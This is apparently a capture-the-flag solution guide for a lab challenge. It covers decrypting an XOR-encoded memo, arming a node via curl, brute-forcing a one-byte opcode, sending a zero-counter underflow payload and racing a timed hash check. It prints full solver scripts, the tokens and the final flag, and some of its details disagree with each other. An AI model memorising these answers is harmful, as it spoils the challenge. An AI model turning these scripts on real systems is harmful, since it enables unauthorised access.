# Gh0st Protocol

This guide will walk you through the decryption of gh0st protocol which protects nuclear codes that the adversary is in search of.

## Overview
* **Mandatory**: Recon the camera node and retrieve the *ops memo*. It teaches you how to arm the node.
* Arm the Gh0st node via an internal HTTP call (derived token).
* Reverse a single-byte opcode handshake and a 7-byte auth with an underflow bug.
* Perform a tight epoch-based hash sync.
* Finalize in the GUI once the TCP sync is complete.

### Special Note (GHOSTSYNC)

In many parts of this guide you will find "GHOSTSYNC-9321" as the SESSION_ID. Please note that `your` SESSION_ID will be different as it is randomly generated per challenge instance.

## Question 1

***The Gh0st Protocol Entrypoint exists on `TCP port 4000`; this node is disabled by default and will refuse interaction. Search the camera system and logs for a `one-byte` encryption key you can to decrypt an archive containing an `operations memo`. Only after this, can you learn how to enable it.***

### Steps

#### Developing our payload

1) SSH into `prison cam` using the following command and password (`hunt`):

```bash
ssh brian@prison-cam
```

2) As you begin to enumerate the asset, you'll find a camera’s logs hint at a hidden buffer and a key:

**Command**

```bash
cat /var/log/prison/camera_log.txt
```

**Output**

```bash
$ cat /var/log/prison/camera_log.txt
camera rotate :: framebuf=.cache/.vidbuf :: key=0x37
```

💡 Please note that keys are **randomized**. The key present in this guide may not be your designated key.

3) Looking further into the directories available (enumeration), we find the `rotated` directory and a file called `.ops_memo.txt.gz.enc`:

**Command**

```bash
ls -lhart  
```

**Output**

```bash
$ ls -lhart
total 12K
drwxr-xr-x 2 root root 4.0K Feb  5 00:32 .
-rw-r--r-- 1 root root  455 Feb  5 00:32 .ops_memo.txt.gz.enc
drwxr-xr-x 4 root root 4.0K Feb  5 00:32 ..
```

The memo is **XOR-encoded** with the byte key from the log (e.g., `0x37`) and then gzipped.

💡 Alternatively, you can bring this file back to our `kali` workstation to decrypt it:

**Command**

```bash
scp brian@prison-cam:/var/log/prison/rotated/.ops_memo.txt.gz.enc .
```

**Output**

```bash
┌──(user㉿85a2da107e67)-[~/]
└─$ scp brian@prison-cam:/var/log/prison/rotated/.ops_memo.txt.gz.enc .
brian@prison-cam's password: 
.ops_memo.txt.gz.enc                      100%  455     1.0MB/s   00:00  
```

4) To recover the memo (`using the prison-cam system`), use a script akin to the following: 

**Command**

```python
import gzip
key = 0x37  # from camera_log.txt
data = open('/var/log/prison/rotated/.ops_memo.txt.gz.enc','rb').read()
print(gzip.decompress(bytes(b ^ key for b in data)).decode())
```

**Output**

You will now receive the following contents:

```bash
$ python 
Python 3.11.13 (main, Aug 12 2025, 22:45:40) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import gzip
>>> key = 0x37  # from fake_log.txt
>>> data = open('/var/log/prison/rotated/.ops_memo.txt.gz.enc','rb').read()
>>> print(gzip.decompress(bytes(b ^ key for b in data)).decode())
PRISON-CAM OPS MEMO
- Gh0st node requires ARMED state before accepting protocol traffic.
- Arming token formula: token = SHA256("GHOST-ARM:" + key_hex)
- Submit via internal channel:
  curl -X POST http://gh0st-protocol:8081/arm -d "code=<hex>"
- Observations:
  * Handshake uses single-byte opcode (acknowledged when correct).
  * Follow-on auth appears fixed-length: 1 + 2 + 4 = 7 bytes.
  * Counter anomaly suggests underflow acceptance.
  * Ghost-sync: tight epoch window (± few seconds).
  * SESSION ID: GHOST-SYCN
  * Meeting-room GUI remains LOCKED until ghost-sync completes.
```

5) To enable the node, we'll use everything we learned from the prison camera and get the SHA256 value we desire:

**Command**

```python
# Replace 37 with the hex key you found in the log
import hashlib; key_hex="37"
print(hashlib.sha256(("GHOST-ARM:"+key_hex).encode()).hexdigest())
```

**Output**

```python
>>> import hashlib; key_hex="37"
>>> print(hashlib.sha256(("GHOST-ARM:"+key_hex).encode()).hexdigest())
ffeb6be7f2d01f8b7e117f1e0c0f4097040df77275ef0ba1289a559a076861f8
```

6) Now `POST` it (via cURL) from your `kali` workstation:

**Command**

```bash
curl -s -X POST http://gh0st-protocol:8081/arm -d "code=ffeb6be7f2d01f8b7e117f1e0c0f4097040df77275ef0ba1289a559a076861f8"
```

**Output**

```bash
┌──(user㉿85a2da107e67)-[~]
└─$ curl -s -X POST http://gh0st-protocol:8081/arm -d "code=ffeb6be7f2d01f8b7e117f1e0c0f4097040df77275ef0ba1289a559a076861f8"
{"ok": true, "armed": true}
```

7) Gh0st Node is now online:

**Command**

```bash
nc -vv gh0st-protocol 4000
```

**Output**

```bash
┌──(user㉿85a2da107e67)-[~]
└─$ nc -vv gh0st-protocol 4000                                                                                                                 
DNS fwd/rev mismatch: gh0st-protocol != 67-gh0st-protocol-43.competitor_net-67-43
gh0st-protocol [10.0.76.4] 4000 (?) open

   ______     __  __     ______     ______     ______      ______   ______     ______     ______   ______     ______     ______     __        
  /\  ___\   /\ \_\ \   /\  __ \   /\  ___\   /\__  _\    /\  == \ /\  == \   /\  __ \   /\__  _\ /\  __ \   /\  ___\   /\  __ \   /\ \       
  \ \ \__ \  \ \  __ \  \ \ \/\ \  \ \___  \  \/_/\ \/    \ \  _-/ \ \  __<   \ \ \/\ \  \/_/\ \/ \ \ \/\ \  \ \ \____  \ \ \/\ \  \ \ \____  
   \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\    \ \_\     \ \_\    \ \_\ \_\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_____\  \ \_____\ 
    \/_____/   \/_/\/_/   \/_____/   \/_____/     \/_/      \/_/     \/_/ /_/   \/_____/     \/_/   \/_____/   \/_____/   \/_____/   \/_____/ 
                                                                                                                                            
    
Version 1.07
F O R    U S E  B Y  L E V E L  V  O P E R A T O R S  O N L Y.
▶️ Single-byte opcode interface online.
▶️ Awaiting opcode...
```

💡 Please note that trying to connect to gh0st-protocol `before` enabling it, will yield both a visual and terminal based error (depending on how you connect to it):

**Command**

```bash
nc -vv gh0st-protocol 4000
```

**Output**

```bash
akuma@devops:~/t02-round2-gh0st_protocol/challenge$ nc -vv gh0st-protocol 4000
Connection to gh0st-protocol 4000 port [tcp/*] succeeded!
== Gh0st Node v1 ==
[LOCKED] Node is disabled.
Access denied.
```

#### Communicating with the Gh0st Protocol node 

To obtain token 1, we need to trigger a single-byte handshake. As you interact with the socket located at gh0st-protocol 

**Discovery**
- After arming, connect to port `4000`. A minimal banner indicates it accepts a **single-byte opcode**.
- Wrong length/opcode yields `[NACK]`.

Here's a script that will give you the appropriate opcode:

```python
#!/usr/bin/env python3
import argparse, socket, time, sys

def read_all(sock, wait=0.12, chunk=4096):
    """Read whatever the server sends within a short timeout window."""
    time.sleep(0.05)
    sock.settimeout(wait)
    buf = bytearray()
    while True:
        try:
            data = sock.recv(chunk)
            if not data:
                break
            buf.extend(data)
        except socket.timeout:
            break
        except Exception:
            break
    return bytes(buf)

def try_opcode(host, port, opcode, banner_wait, read_wait, verbose):
    """Connect, read banner, send one byte opcode, read response, classify."""
    s = socket.socket()
    s.settimeout(2.5)
    try:
        s.connect((host, port))
    except Exception as e:
        if verbose:
            print(f"[!] Connect error for 0x{opcode:02x}: {e}")
        return "conn_err", b""
    banner = read_all(s, wait=banner_wait)
    if b"[LOCKED]" in banner:
        s.close()
        return "locked", banner
    try:
        s.sendall(bytes([opcode]))
    except Exception as e:
        if verbose:
            print(f"[!] Send error for 0x{opcode:02x}: {e}")
        s.close()
        return "send_err", banner
    resp = read_all(s, wait=read_wait)
    s.close()

    text = resp.upper()
    if b"[ACK]" in text or b"PHASE 1 COMPLETE" in text:
        return "ack", banner + resp
    if b"[NACK]" in text:
        return "nack", banner + resp
    # If the server closed with no explicit NACK, still treat as miss
    if resp or banner:
        return "unknown", banner + resp
    return "noresp", b""

def main():
    ap = argparse.ArgumentParser(description="Enumerate 1-byte opcodes to find the ACK (expected 0xAC).")
    ap.add_argument("--host", default="gh0st-protocol", help="Target host/IP (default: gh0st-protocol)")
    ap.add_argument("--port", type=int, default=4000, help="Target port (default: 4000)")
    ap.add_argument("--start", type=lambda x:int(x,0), default=0x00, help="Start opcode (e.g., 0x00)")
    ap.add_argument("--end",   type=lambda x:int(x,0), default=0xFF, help="End opcode inclusive (e.g., 0xFF)")
    ap.add_argument("--banner-wait", type=float, default=0.12, help="Wait time to read banner (s)")
    ap.add_argument("--read-wait",   type=float, default=0.15, help="Wait time to read response (s)")
    ap.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = ap.parse_args()

    print(f"[*] Scanning opcodes on {args.host}:{args.port} from 0x{args.start:02X} to 0x{args.end:02X}")
    for op in range(args.start, args.end + 1):
        status, data = try_opcode(args.host, args.port, op, args.banner_wait, args.read_wait, args.verbose)
        if status == "locked":
            print("[!] Node is LOCKED. Arm it first (per challenge flow) before scanning.")
            if args.verbose:
                print(data.decode(errors="ignore"), end="")
            sys.exit(2)
        elif status == "ack":
            print(f"[+] ACK on opcode 0x{op:02X}")
            if args.verbose:
                print(data.decode(errors="ignore"), end="")
            return
        elif args.verbose:
            # show brief per-opcode status when verbose
            msg = data.decode(errors="ignore")
            print(f"[-] 0x{op:02X} -> {status}{' | ' + msg.strip().splitlines()[-1] if msg.strip() else ''}")
        else:
            # terse progress dots
            print(".", end="", flush=True)

    print("\n[-] No ACK found in the scanned range.")

if __name__ == "__main__":
    main()
```

**Command**

```bash
python3 token1_byte_finder.py
```

**Output**

```bash
┌──(user㉿85a2da107e67)-[~]
└─$ python3 token1_byte_finder.py                                                                                                                        
[*] Scanning opcodes on gh0st-protocol:4000 from 0x00 to 0xFF
............................................................................................................................................................................[+] ACK on opcode 0xAC
```


💡 Alternatively, you can use `prinf` (scripted or unscripted) to find the byte accordingly. For the sake of time, let's assume we discovered the correct opcode (which is `\xAC` for our purposes):

**Command**

```bash
# Handshake (opcode is not revealed; test 0xAC per memo hints)
printf '\xAC' | nc gh0st-protocol 4000
```

***Output**

```bash
┌──(user㉿85a2da107e67)-[~]
└─$ printf '\xAC' | nc -vv gh0st-protocol 4000                                                                                                                 
DNS fwd/rev mismatch: gh0st-protocol != 67-gh0st-protocol-43.competitor_net-67-43
gh0st-protocol [10.0.76.4] 4000 (?) open

   ______     __  __     ______     ______     ______      ______   ______     ______     ______   ______     ______     ______     __        
  /\  ___\   /\ \_\ \   /\  __ \   /\  ___\   /\__  _\    /\  == \ /\  == \   /\  __ \   /\__  _\ /\  __ \   /\  ___\   /\  __ \   /\ \       
  \ \ \__ \  \ \  __ \  \ \ \/\ \  \ \___  \  \/_/\ \/    \ \  _-/ \ \  __<   \ \ \/\ \  \/_/\ \/ \ \ \/\ \  \ \ \____  \ \ \/\ \  \ \ \____  
   \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\    \ \_\     \ \_\    \ \_\ \_\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_____\  \ \_____\ 
    \/_____/   \/_/\/_/   \/_____/   \/_____/     \/_/      \/_/     \/_/ /_/   \/_____/     \/_/   \/_____/   \/_____/   \/_____/   \/_____/ 
                                                                                                                                            
    
Version 1.07
F O R    U S E  B Y  L E V E L  V  O P E R A T O R S  O N L Y.
▶️ Single-byte opcode interface online.
▶️ Awaiting opcode...
[ACK] Opcode accepted. Phase 1 complete.
✅ TOKEN1: <VALUE>
```

## Answer

The value of token 1 is the answer to this question.

## Question 2

***After the initial handshake, Gh0st Protocol initiates a session authentication phase that validates multiple structured fields supplied by the client. Analyze the session validation logic and identify a weakness that allows authentication without meeting the intended counter requirements.***

1) Here's a code snippet we'll use to advance in the challenge. Once you receive token 1, the protocol immediately jumps into Phase 2:

```python
# q1_handshake.py
import socket, time
s = socket.socket(); s.connect(("gh0st-protocol", 4000))
time.sleep(0.05); print(s.recv(4096).decode(), end="")   # banner
s.sendall(b"\xAC")
time.sleep(0.05); print(s.recv(4096).decode(), end="")   # ACK + TOKEN1 + phase 2 prompt
s.close()
```

2) Based on the spec provided via the `prison-cam`, we find that an underflow condition exists which will allow us to send null data to the interface to fill the appropriate buffer:

```text
Phase 2 requires **7 bytes**:  
  `0xBB` + `session (0xDEAD, BE)` + `counter (4 bytes, BE)`.  
- An **underflow** condition allows a zero counter to pass.
```

Here's a script that will combine the spec and our original opcode to continue the chain of exploitation: 

```python
#!/usr/bin/env python3
# token2_solver.py
import socket, time
s = socket.socket(); s.connect(("gh0st-protocol", 4000)) # Target
time.sleep(0.05); s.recv(4096)     # banner
s.sendall(b"\xAC"); time.sleep(0.05); s.recv(4096)

payload = b"\xBB" + b"\xDE\xAD" + b"\x00\x00\x00\x00"
s.sendall(payload)
time.sleep(0.1)
print(s.recv(4096).decode(), end="")  # SESSION ACCEPTED + TOKEN2
s.close()
```

3) If done correctly, you will receive a new token and entrance into phase 3:

**Command**

```bash
python3 token2_solver.py
```

**Output**

```bash
[SESSION ACCEPTED] Welcome Brian.
✅ TOKEN2: CAM2-TOKEN-ABC
== Phase 3: Ghost-sync required ==
EPOCH: 1756797493
Compute SHA256(SESSION_ID + epoch) and transmit hex within ±3 seconds.
Submit as a single line (64 hex chars). Awaiting hash...
```

## Answer
The value of the token is the `answer` to this question.

## Question 3
***Gh0st Protocol now enforces a `synchronization` mechanism that binds authentication to a narrow `time window`. Observe the synchronization challenge, determine how the server validates client responses, and produce a valid response within the allowed temporal tolerance.***

1) The server prints:

```text
EPOCH: <current>
Compute SHA256(SESSION_ID + epoch) and transmit hex within ±3 seconds.
```

💡 NOTE: You must send the 64-hex-character SHA256 string quickly. Let's create a script to get us from `token1` to `token3`'s entrypoint and then solve the epoch issue:

```python
#!/usr/bin/env python3
import argparse, socket, time, hashlib, sys, urllib.request, urllib.parse, json, re

def http_get(url, timeout=1.5):
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode()

def http_post(url, data: dict, timeout=1.5):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode()

def read_some(s, wait=0.08, chunk=65535):
    """Short timed read; returns bytes (non-blocking-ish)."""
    time.sleep(wait)
    s.settimeout(wait)
    buf = bytearray()
    while True:
        try:
            b = s.recv(chunk)
            if not b:
                break
            buf.extend(b)
            if len(b) < chunk:
                break
        except Exception:
            break
    return bytes(buf)

def connect(host, port, timeout=3.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    return s

def ensure_armed(status_url, arm_key_hex=None, verbose=True):
    # Check status
    try:
        st = json.loads(http_get(status_url))
    except Exception as e:
        if verbose:
            print(f"[!] Could not reach status endpoint {status_url}: {e}")
        return False
    if st.get("armed"):
        if verbose:
            print("[*] Node is ARMED.")
        return True
    if arm_key_hex is None:
        if verbose:
            print("[!] Node is DISARMED. Provide --arm-key-hex (from SSH memo) or arm it manually.")
        return False
    # Compute arm token and POST
    token = hashlib.sha256(("GHOST-ARM:" + arm_key_hex.lower()).encode()).hexdigest()
    try:
        resp = json.loads(http_post(status_url.rsplit("/",1)[0] + "/arm", {"token": token}))
        if resp.get("ok") and resp.get("armed"):
            print("[+] Armed successfully.")
            return True
        else:
            print(f"[!] Arm POST failed: {resp}")
            return False
    except Exception as e:
        print(f"[!] Arm POST error: {e}")
        return False

def solve_token3(host, port, session_id, verbose=True):
    s = connect(host, port)
    # banner
    ban = read_some(s)
    if b"[LOCKED]" in ban:
        s.close()
        raise RuntimeError("Node is LOCKED (not armed).")
    if verbose and ban:
        print(ban.decode(errors="ignore"), end="")

    # Phase 1: 0xAC
    s.sendall(b"\xAC")
    out = read_some(s)
    if verbose and out:
        print(out.decode(errors="ignore"), end="")
    if b"[ACK]" not in out:
        s.close()
        raise RuntimeError("Handshake (0xAC) not acknowledged.")

    # Phase 2: 0xBB + 0xDEAD + 0x00000000
    s.sendall(b"\xBB" + b"\xDE\xAD" + b"\x00\x00\x00\x00")
    out = read_some(s, wait=0.12)
    if verbose and out:
        print(out.decode(errors="ignore"), end="")
    if b"SESSION ACCEPTED" not in out:
        s.close()
        raise RuntimeError("Phase 2 underflow not accepted.")

    # Phase 3 prompt (contains EPOCH line; not strictly needed for success)
    out = read_some(s, wait=0.12)
    if verbose and out:
        print(out.decode(errors="ignore"), end="")

    # Compute hash with our *current* epoch to match server's ±3s window
    epoch_now = str(int(time.time()))
    h = hashlib.sha256((session_id + epoch_now).encode()).hexdigest()
    s.sendall((h + "\n").encode())

    # Final read
    final = read_some(s, wait=0.15)
    if verbose and final:
        print(final.decode(errors="ignore"), end="")
    s.close()

    if b"[SYNC SUCCESS]" not in final:
        raise RuntimeError("Sync failed (timing or SESSION_ID). Try again quickly.")

def main():
    ap = argparse.ArgumentParser(description="Solve Gh0st Protocol Token 3 (with optional arming).")
    ap.add_argument("--host", default="gh0st-protocol", help="TCP host for port 4000")
    ap.add_argument("--port", type=int, default=4000, help="TCP port (default 4000)")
    ap.add_argument("--status-url", default="http://gh0st-protocol:8081/status",
                    help="HTTP status URL for arming/ready checks (default internal DNS URL).")
    ap.add_argument("--session-id", default="GHOSTSYNC-9321",
                    help="SESSION_ID from SSH memo (default GHOSTSYNC-9321).")
    ap.add_argument("--arm-key-hex", help="If provided, compute arm token and POST to /arm first (value from SSH memo log key).")
    ap.add_argument("-q", "--quiet", action="store_true", help="Less output")
    args = ap.parse_args()

    verbose = not args.quiet

    # Ensure ARMED
    if not ensure_armed(args.status_url, args.arm_key_hex, verbose=verbose):
        sys.exit(2)

    # Try token3 a couple times to beat any timing jitter
    attempts = 3
    for i in range(1, attempts+1):
        try:
            if verbose:
                print(f"[*] Token3 attempt {i}/{attempts} …")
            solve_token3(args.host, args.port, args.session_id, verbose=verbose)
            print("[+] Token 3 solved.")
            return
        except Exception as e:
            if verbose:
                print(f"[!] Attempt {i} failed: {e}")
            time.sleep(0.3)

    print("[-] Could not solve Token 3. Check SESSION_ID, timing, and ARMED state.")
    sys.exit(1)

if __name__ == "__main__":
    main()
```

**Command**

```bash
python3 token3_solver.py --session-id "YOUR GHOSTSYNC-XXXX ID"
```

**Output**

```python
[*] Node is ARMED.
[*] Token3 attempt 1/3 …
== Gh0st Node v1 ==
Single-byte opcode interface online.
Awaiting opcode...
[ACK] Opcode accepted. Phase 1 complete.
✅ TOKEN1: CAM1-TOKEN-XYZ
== Phase 2: Session authentication required ==
Spec: send 7 bytes -> 0xBB + session (2 bytes, BE) + counter (4 bytes, BE)
Session: 0xDEAD, Counter: 0x00000100
[SESSION ACCEPTED] Welcome ghost agent.
✅ TOKEN2: CAM2-TOKEN-ABC
== Phase 3: Ghost-sync required ==
EPOCH: 1756799042
Compute SHA256(SESSION_ID + epoch) and transmit hex within ±3 seconds.
Submit as a single line (64 hex chars). Awaiting hash...
[SYNC SUCCESS] Epoch window match.
✅ TOKEN3: cobalt_s3cur3_789
Proceed to the Suitcase GUI to finalize:
 - URL: http://meeting-room:8080 
 - Input: SHA256(SESSION_ID + current_epoch) within ±3s to reveal final payload.
```

## Answer 

The value of the token is the `answer` to this question.

### Special Note
Note: The GUI at `:8080` remains `SESSION: [LOCKED]` until you complete `token 3`. Once token 3 is solved, the SESSION value is updated on the Suitcase GUI.


## Question 4
***The launch code (final token) is hidden in the very suitcase you're using in the `Meeting Room`. Access it and execute the appropriate timing attack to reveal the launch code and complete your mission...for now.***


### Overview

Here are some things to note:

* We now have access to `http://meeting-room:8080`.  
* The GUI shows the session and accepts the final hash.
* The GUI expects the `same` value: `SHA256(SESSION_ID + current_epoch)` within ±3 seconds.
* Since this is a GUI, we'll need to code something that can get us in the window since copy and pasting a value is not possible with this tight of a timing.


### Steps

1) With everything in hand, we can take the `SESSION VALUE` and add epoch to it using the following script:


**Solver**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solve Gh0st Protocol TOKEN4 via the GUI

Strategy:
  1) (Optional) Poll status endpoint until ready=true (after Token 3).
  2) Compute candidate SHA256 hashes for SESSION_ID + epoch across a ±window.
  3) POST each candidate to the GUI ("hash" form field) until success.
  4) Extract and print TOKEN4.

No third-party deps; uses Python stdlib only.
"""

import argparse
import hashlib
import json
import re
import sys
import time
import urllib.parse
import urllib.request

DEFAULT_URL = "http://gh0st-protocol:8080/"
DEFAULT_STATUS_URL = "http://gh0st-protocol:8081/status"
DEFAULT_SESSION_ID = "GHOSTSYNC-9321"  # CHANGE TO YOUR GHOSTSYNC SESSION ID

UA = "Gh0st-Protocol-Client/1.0"

TOKEN4_RE = re.compile(r"(?i)TOKEN4[:\s]+([A-Za-z0-9_\-:\{\}]+)")

def http_get(url: str, timeout: float = 1.5) -> str:
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="ignore")

def http_post_form(url: str, data: dict, timeout: float = 1.5) -> str:
    body = urllib.parse.urlencode(data).encode()
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="ignore")

def is_ready(status_url: str, quiet: bool) -> bool:
    try:
        raw = http_get(status_url, timeout=1.5)
        data = json.loads(raw)
        ready = bool(data.get("ready"))
        if not quiet:
            print(f"[*] Status: armed={data.get('armed')} ready={ready}")
        return ready
    except Exception as e:
        if not quiet:
            print(f"[!] Status check failed: {e}")
        # If status is unreachable, we can still try the GUI directly.
        return False

def extract_token4(html: str):
    m = TOKEN4_RE.search(html)
    return m.group(1) if m else None

def attempt_once(gui_url: str, session_id: str, offset_window: int, quiet: bool):
    # Compute candidates across ±offset_window around *current* epoch.
    now = int(time.time())
    candidates = []
    for off in range(-offset_window, offset_window + 1):
        epoch = str(now + off)
        h = hashlib.sha256((session_id + epoch).encode()).hexdigest()
        candidates.append(h)

    # Submit candidates (earliest first)
    for idx, h in enumerate(candidates, 1):
        if not quiet:
            print(f"[*] Attempt {idx}/{len(candidates)} with epoch≈now{'{:+d}'.format(idx- (offset_window+1)) if not quiet else ''}")
        try:
            html = http_post_form(gui_url, {"hash": h})
        except Exception as e:
            if not quiet:
                print(f"[!] POST error: {e}")
            continue
        tok = extract_token4(html)
        if tok:
            print(f"[+] ✅ TOKEN4: {tok}")
            return True
        # Optional: print last line of html for debugging when verbose
        if not quiet:
            last = [ln for ln in html.splitlines() if ln.strip()]
            if last:
                print(f"    GUI says: {last[-1]}")
    return False

def main():
    ap = argparse.ArgumentParser(description="Beat Gh0st Protocol Token 4.")
    ap.add_argument("--url", default=DEFAULT_URL,
                    help=f"GUI URL (default: {DEFAULT_URL})")
    ap.add_argument("--status-url", default=DEFAULT_STATUS_URL,
                    help=f"Status URL (default: {DEFAULT_STATUS_URL})")
    ap.add_argument("--session-id", default=DEFAULT_SESSION_ID,
                    help=f"SESSION_ID (from SSH memo). Default: {DEFAULT_SESSION_ID}")
    ap.add_argument("--window", type=int, default=3,
                    help="Epoch drift window in seconds (±window). Default: 3")
    ap.add_argument("--retries", type=int, default=5,
                    help="Number of bursts to try before giving up. Default: 5")
    ap.add_argument("--wait", type=float, default=0.35,
                    help="Delay between bursts (seconds). Default: 0.35")
    ap.add_argument("--skip-ready-check", action="store_true",
                    help="Skip polling /status for ready=true.")
    ap.add_argument("-q", "--quiet", action="store_true",
                    help="Less output.")
    args = ap.parse_args()

    if not args.skip_ready_check:
        # Poll readiness up to ~10 seconds (or continue if unreachable)
        deadline = time.time() + 10.0
        while time.time() < deadline:
            if is_ready(args.status_url, quiet=args.quiet):
                break
            time.sleep(0.5)

    # Try several bursts to beat timing jitter
    for attempt in range(1, args.retries + 1):
        if not args.quiet:
            print(f"[*] Burst {attempt}/{args.retries}")
        if attempt_once(args.url, args.session_id, args.window, args.quiet):
            return 0
        time.sleep(args.wait)

    print("[-] Failed to obtain TOKEN4. Check SESSION_ID, readiness, and try increasing --window/--retries.")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

2) We can then use this command to complete acquisition of this token:

**Command**

```bash
python3 token4_solver.py --session-id GHOSTSYNC-9321 --window 3 --skip-ready-check --url http://meeting-room:8080
```

**Output**

```python
python3 token4_solver.py --session-id GHOSTSYNC-9321 --window 3 --skip-ready-check --url http://meeting-room:8080
[*] Burst 1/5
[*] Attempt 1/7 with epoch≈now-3
[+] ✅ TOKEN4: PCCC{LAUNCH_8256709}
```

🔥 NOTE: You must be quick in order to receive the token. If you do not compute the time fast enough, simply re-run this script multiple times and you should receive the token.

## Answer 

The value of the token is the `answer` to this question.

**This completes the Solution Guide for this challenge.**